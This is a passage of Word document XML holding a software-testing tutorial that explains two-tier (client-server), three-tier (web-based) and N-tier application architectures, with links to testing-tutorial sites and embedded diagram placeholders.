            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:b/>
            <w:bCs/>
            <w:color w:val="222222"/>
            <w:sz w:val="36"/>
            <w:szCs w:val="36"/>
          </w:rPr>
          <w:t>Two-Tier Architecture:</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00245D89" w:rsidRDefault="00245D89" w:rsidP="00245D89">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="390" w:afterAutospacing="0"/>
        <w:rPr>
          <w:ins w:id="1333" w:author="Unknown"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="222222"/>
          <w:sz w:val="27"/>
          <w:szCs w:val="27"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="1334" w:author="Unknown">
        <w:r>
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:color w:val="222222"/>
            <w:sz w:val="27"/>
            <w:szCs w:val="27"/>
          </w:rPr>
          <w:t>Two Tier application AKA Client-Server application</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00245D89" w:rsidRDefault="00245D89" w:rsidP="00245D89">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="390" w:afterAutospacing="0"/>
        <w:rPr>
          <w:ins w:id="1335" w:author="Unknown"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="222222"/>
          <w:sz w:val="27"/>
          <w:szCs w:val="27"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:noProof/>
          <w:color w:val="222222"/>
          <w:sz w:val="27"/>
          <w:szCs w:val="27"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0">
            <wp:extent cx="5145405" cy="3424555"/>
            <wp:effectExtent l="0" t="0" r="0" b="0"/>
            <wp:docPr id="90" name="Picture 90" descr="Two Tier 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wo Tier Software Architectur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45405" cy="3424555"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                    <a:noFill/>
                    <a:ln>
                      <a:noFill/>
                    </a:ln>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w:rsidR="00245D89" w:rsidRDefault="00245D89" w:rsidP="00245D89">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="390" w:afterAutospacing="0"/>
        <w:rPr>
          <w:ins w:id="1336" w:author="Unknown"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="222222"/>
          <w:sz w:val="27"/>
          <w:szCs w:val="27"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="1337" w:author="Unknown">
        <w:r>
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:color w:val="222222"/>
            <w:sz w:val="27"/>
            <w:szCs w:val="27"/>
          </w:rPr>
          <w:t>The Two-tier architecture is divided into two parts:</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00245D89" w:rsidRDefault="00245D89" w:rsidP="00245D89">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="390" w:afterAutospacing="0"/>
        <w:rPr>
          <w:ins w:id="1338" w:author="Unknown"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="222222"/>
          <w:sz w:val="27"/>
          <w:szCs w:val="27"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="1339" w:author="Unknown">
        <w:r>
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:color w:val="222222"/>
            <w:sz w:val="27"/>
            <w:szCs w:val="27"/>
          </w:rPr>
          <w:t>1. Client Application (Client Tier</w:t>
        </w:r>
        <w:proofErr w:type="gramStart"/>
        <w:r>
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:color w:val="222222"/>
            <w:sz w:val="27"/>
            <w:szCs w:val="27"/>
          </w:rPr>
          <w:t>)</w:t>
        </w:r>
        <w:proofErr w:type="gramEnd"/>
        <w:r>
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:color w:val="222222"/>
            <w:sz w:val="27"/>
            <w:szCs w:val="27"/>
          </w:rPr>
          <w:br/>
          <w:t>2. Database (Data Tier)</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00245D89" w:rsidRDefault="00245D89" w:rsidP="00245D89">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="390" w:afterAutospacing="0"/>
        <w:rPr>
          <w:ins w:id="1340" w:author="Unknown"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="222222"/>
          <w:sz w:val="27"/>
          <w:szCs w:val="27"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="1341" w:author="Unknown">
        <w:r>
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:color w:val="222222"/>
            <w:sz w:val="27"/>
            <w:szCs w:val="27"/>
          </w:rPr>
          <w:t>Client system handles both Presentation and Application layers and Server system handles Database layer. It is also known as client server application. The communication takes place between the Client and the Server. Client system sends the request to the Server system and the Server system processes the request and sends back the data to the Client System</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00245D89" w:rsidRDefault="00245D89" w:rsidP="00245D89">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="390" w:afterAutospacing="0"/>
        <w:rPr>
          <w:ins w:id="1342" w:author="Unknown"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="222222"/>
          <w:sz w:val="27"/>
          <w:szCs w:val="27"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="1343" w:author="Unknown">
        <w:r>
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:color w:val="222222"/>
            <w:sz w:val="27"/>
            <w:szCs w:val="27"/>
          </w:rPr>
          <w:t>Must Read: </w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:color w:val="222222"/>
            <w:sz w:val="27"/>
            <w:szCs w:val="27"/>
          </w:rPr>
          <w:fldChar w:fldCharType="begin"/>
        </w:r>
        <w:r>
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:color w:val="222222"/>
            <w:sz w:val="27"/>
            <w:szCs w:val="27"/>
          </w:rPr>
          <w:instrText xml:space="preserve"> HYPERLINK "https://www.softwaretestingmaterial.com/sql-tutorial-complete/" </w:instrText>
        </w:r>
        <w:r>
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:color w:val="222222"/>
            <w:sz w:val="27"/>
            <w:szCs w:val="27"/>
          </w:rPr>
          <w:fldChar w:fldCharType="separate"/>
        </w:r>
        <w:r>
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:color w:val="E8554E"/>
            <w:sz w:val="27"/>
            <w:szCs w:val="27"/>
          </w:rPr>
          <w:t>SQL for Software Testers Complete Tutorial</w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:color w:val="222222"/>
            <w:sz w:val="27"/>
            <w:szCs w:val="27"/>
          </w:rPr>
          <w:fldChar w:fldCharType="end"/>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00245D89" w:rsidRDefault="00245D89" w:rsidP="00245D89">
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:before="0" w:after="240"/>
        <w:rPr>
          <w:ins w:id="1344" w:author="Unknown"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:b w:val="0"/>
          <w:bCs w:val="0"/>
          <w:color w:val="222222"/>
          <w:sz w:val="36"/>
          <w:szCs w:val="36"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="1345" w:author="Unknown">
        <w:r>
          <w:rPr>
            <w:rStyle w:val="Strong"/>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:b/>
            <w:bCs/>
            <w:color w:val="222222"/>
            <w:sz w:val="36"/>
            <w:szCs w:val="36"/>
          </w:rPr>
          <w:t>Three-Tier Architecture:</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00245D89" w:rsidRDefault="00245D89" w:rsidP="00245D89">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="390" w:afterAutospacing="0"/>
        <w:rPr>
          <w:ins w:id="1346" w:author="Unknown"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="222222"/>
          <w:sz w:val="27"/>
          <w:szCs w:val="27"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="1347" w:author="Unknown">
        <w:r>
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:color w:val="222222"/>
            <w:sz w:val="27"/>
            <w:szCs w:val="27"/>
          </w:rPr>
          <w:t>Three Tier application AKA Web Based application</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00245D89" w:rsidRDefault="00245D89" w:rsidP="00245D89">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="390" w:afterAutospacing="0"/>
        <w:rPr>
          <w:ins w:id="1348" w:author="Unknown"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="222222"/>
          <w:sz w:val="27"/>
          <w:szCs w:val="27"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:noProof/>
          <w:color w:val="222222"/>
          <w:sz w:val="27"/>
          <w:szCs w:val="27"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0">
            <wp:extent cx="5145405" cy="2759710"/>
            <wp:effectExtent l="0" t="0" r="0" b="0"/>
            <wp:docPr id="89" name="Picture 89" descr="Three Tier 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ree Tier Software Architectur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45405" cy="2759710"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                    <a:noFill/>
                    <a:ln>
                      <a:noFill/>
                    </a:ln>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w:rsidR="00245D89" w:rsidRDefault="00245D89" w:rsidP="00245D89">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="390" w:afterAutospacing="0"/>
        <w:rPr>
          <w:ins w:id="1349" w:author="Unknown"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="222222"/>
          <w:sz w:val="27"/>
          <w:szCs w:val="27"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="1350" w:author="Unknown">
        <w:r>
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:color w:val="222222"/>
            <w:sz w:val="27"/>
            <w:szCs w:val="27"/>
          </w:rPr>
          <w:t>The Three-tier architecture is divided into three parts:</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00245D89" w:rsidRDefault="00245D89" w:rsidP="00245D89">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="390" w:afterAutospacing="0"/>
        <w:rPr>
          <w:ins w:id="1351" w:author="Unknown"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="222222"/>
          <w:sz w:val="27"/>
          <w:szCs w:val="27"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="1352" w:author="Unknown">
        <w:r>
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:color w:val="222222"/>
            <w:sz w:val="27"/>
            <w:szCs w:val="27"/>
          </w:rPr>
          <w:t>1. Presentation layer (Client Tier</w:t>
        </w:r>
        <w:proofErr w:type="gramStart"/>
        <w:r>
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:color w:val="222222"/>
            <w:sz w:val="27"/>
            <w:szCs w:val="27"/>
          </w:rPr>
          <w:t>)</w:t>
        </w:r>
        <w:proofErr w:type="gramEnd"/>
        <w:r>
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:color w:val="222222"/>
            <w:sz w:val="27"/>
            <w:szCs w:val="27"/>
          </w:rPr>
          <w:br/>
          <w:t>2. Application layer (Business Tier</w:t>
        </w:r>
        <w:proofErr w:type="gramStart"/>
        <w:r>
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:color w:val="222222"/>
            <w:sz w:val="27"/>
            <w:szCs w:val="27"/>
          </w:rPr>
          <w:t>)</w:t>
        </w:r>
        <w:proofErr w:type="gramEnd"/>
        <w:r>
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:color w:val="222222"/>
            <w:sz w:val="27"/>
            <w:szCs w:val="27"/>
          </w:rPr>
          <w:br/>
          <w:t>2. Database layer (Data Tier)</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00245D89" w:rsidRDefault="00245D89" w:rsidP="00245D89">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="390" w:afterAutospacing="0"/>
        <w:rPr>
          <w:ins w:id="1353" w:author="Unknown"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="222222"/>
          <w:sz w:val="27"/>
          <w:szCs w:val="27"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="1354" w:author="Unknown">
        <w:r>
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:color w:val="222222"/>
            <w:sz w:val="27"/>
            <w:szCs w:val="27"/>
          </w:rPr>
          <w:t>Client system handles Presentation layer, Application server handles Application layer and Server system handles Database layer.</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00245D89" w:rsidRDefault="00245D89" w:rsidP="00245D89">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="390" w:afterAutospacing="0"/>
        <w:rPr>
          <w:ins w:id="1355" w:author="Unknown"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="222222"/>
          <w:sz w:val="27"/>
          <w:szCs w:val="27"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="1356" w:author="Unknown">
        <w:r>
          <w:rPr>
            <w:rStyle w:val="Strong"/>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:color w:val="222222"/>
            <w:sz w:val="27"/>
            <w:szCs w:val="27"/>
          </w:rPr>
          <w:t>Note:</w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:color w:val="222222"/>
            <w:sz w:val="27"/>
            <w:szCs w:val="27"/>
          </w:rPr>
          <w:t xml:space="preserve"> Another layer is N-Tier application. </w:t>
        </w:r>
        <w:proofErr w:type="gramStart"/>
        <w:r>
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:color w:val="222222"/>
            <w:sz w:val="27"/>
            <w:szCs w:val="27"/>
          </w:rPr>
          <w:t>N-Tier application AKA Distributed application.</w:t>
        </w:r>
        <w:proofErr w:type="gramEnd"/>
        <w:r>
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:color w:val="222222"/>
            <w:sz w:val="27"/>
            <w:szCs w:val="27"/>
          </w:rPr>
          <w:t xml:space="preserve"> It is similar to three tier architecture but number of application servers are increased and represented in individual tiers in order to </w:t>
        </w:r>
        <w:proofErr w:type="gramStart"/>
        <w:r>
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:color w:val="222222"/>
            <w:sz w:val="27"/>
            <w:szCs w:val="27"/>
          </w:rPr>
          <w:t>distributed</w:t>
        </w:r>
        <w:proofErr w:type="gramEnd"/>
        <w:r>
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:color w:val="222222"/>
            <w:sz w:val="27"/>
            <w:szCs w:val="27"/>
          </w:rPr>
          <w:t xml:space="preserve"> the business logic so that the logic will be distributed.</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00447FF1" w:rsidRDefault="00447FF1" w:rsidP="00447FF1">
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:before="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:b w:val="0"/>
          <w:bCs w:val="0"/>
          <w:color w:val="760000"/>
          <w:sz w:val="40"/>
          <w:szCs w:val="40"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:b w:val="0"/>
          <w:bCs w:val="0"/>
          <w:color w:val="760000"/>
          <w:sz w:val="40"/>
          <w:szCs w:val="40"/>
        </w:rPr>
        <w:t xml:space="preserve">What </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:b w:val="0"/>
          <w:bCs w:val="0"/>
          <w:color w:val="760000"/>
          <w:sz w:val="40"/>
          <w:szCs w:val="40"/>
        </w:rPr>
        <w:t>is</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:b w:val="0"/>
          <w:bCs w:val="0"/>
          <w:color w:val="760000"/>
          <w:sz w:val="40"/>
          <w:szCs w:val="40"/>
        </w:rPr>
        <w:t xml:space="preserve"> Difference Between Two-Tier and Three-Tier Architecture?</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00447FF1" w:rsidRDefault="00447FF1" w:rsidP="00447FF1">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:before="240" w:beforeAutospacing="0" w:after="240" w:afterAutospacing="0"/>
        <w:rPr>
          <w:ins w:id="1357" w:author="Unknown"/>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="000000"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="1358" w:author="Unknown">
        <w:r>
          <w:rPr>
            <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
            <w:color w:val="000000"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:t>In my previous post I have outlined points to be considered while testing </w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
            <w:color w:val="000000"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:fldChar w:fldCharType="begin"/>
        </w:r>
        <w:r>
          <w:rPr>
            <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
            <w:color w:val="000000"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:instrText xml:space="preserve"> HYPERLINK "http://www.softwaretestingclass.com/web-application-testing/" \o "Web Testing: Complete Guide To Your Web Application Testing" \t "_blank" </w:instrText>
        </w:r>
        <w:r>
          <w:rPr>
            <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
            <w:color w:val="000000"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:fldChar w:fldCharType="separate"/>
        </w:r>
        <w:r>
          <w:rPr>
            <w:rStyle w:val="Strong"/>
            <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
            <w:color w:val="A90000"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t>Web based applications</w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
            <w:color w:val="000000"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:fldChar w:fldCharType="end"/>
        </w:r>
        <w:r>
          <w:rPr>
            <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
            <w:color w:val="000000"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:t>. In today’s software testing class we are discussing about the </w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:rStyle w:val="Emphasis"/>
            <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
            <w:color w:val="000000"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:t>Two-Tier and Three-Tier architecture</w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
            <w:color w:val="000000"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:t>.</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00447FF1" w:rsidRDefault="00447FF1" w:rsidP="00447FF1">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:before="240" w:beforeAutospacing="0" w:after="240" w:afterAutospacing="0"/>
        <w:rPr>
          <w:ins w:id="1359" w:author="Unknown"/>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="000000"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="1360" w:author="Unknown">
        <w:r>
          <w:rPr>
            <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
            <w:color w:val="000000"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:t>All projects are broadly divided into two types of applications </w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:rStyle w:val="Strong"/>
            <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
            <w:color w:val="000000"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:t>2 tier and 3 tier architecture</w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
            <w:color w:val="000000"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:t>. Basically high level we can say that </w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:rStyle w:val="Emphasis"/>
            <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
            <w:color w:val="000000"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:t>2-tier architecture</w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
            <w:color w:val="000000"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:t> is Client server application and </w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:rStyle w:val="Emphasis"/>
            <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
            <w:color w:val="000000"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:t>3-tier architecture</w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
            <w:color w:val="000000"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:t> is Web based application. Below I am concentrating on the difference between Two-Tier and Three-Tier Architecture, what all advantages, disadvantages and practical examples.</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00447FF1" w:rsidRDefault="00447FF1" w:rsidP="00447FF1">
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:before="72" w:after="150"/>
        <w:rPr>
          <w:ins w:id="1361" w:author="Unknown"/>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:b w:val="0"/>
          <w:bCs w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="30"/>
          <w:szCs w:val="30"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="1362" w:author="Unknown">
        <w:r>
          <w:rPr>
            <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
            <w:color w:val="000000"/>
            <w:sz w:val="30"/>
            <w:szCs w:val="30"/>
          </w:rPr>
          <w:lastRenderedPageBreak/>
          <w:t>Two-Tier Architecture:</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00447FF1" w:rsidRDefault="00447FF1" w:rsidP="00447FF1">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:before="240" w:beforeAutospacing="0" w:after="240" w:afterAutospacing="0"/>
        <w:rPr>
          <w:ins w:id="1363" w:author="Unknown"/>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="000000"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="1364" w:author="Unknown">
        <w:r>
          <w:rPr>
            <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
            <w:color w:val="000000"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:t>The two-tier is based on Client Server architecture. The two-tier architecture is like client server application. The direct communication takes place between client and server. There is no intermediate between client and server. Because of tight coupling a 2 tiered application will run faster.</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00447FF1" w:rsidRDefault="00447FF1" w:rsidP="00447FF1">
      <w:pPr>
        <w:shd w:val="clear" w:color="auto" w:fill="F3F3F3"/>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:ins w:id="1365" w:author="Unknown"/>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="000000"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:noProof/>
          <w:color w:val="A90000"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0">
            <wp:extent cx="3840480" cy="3025775"/>
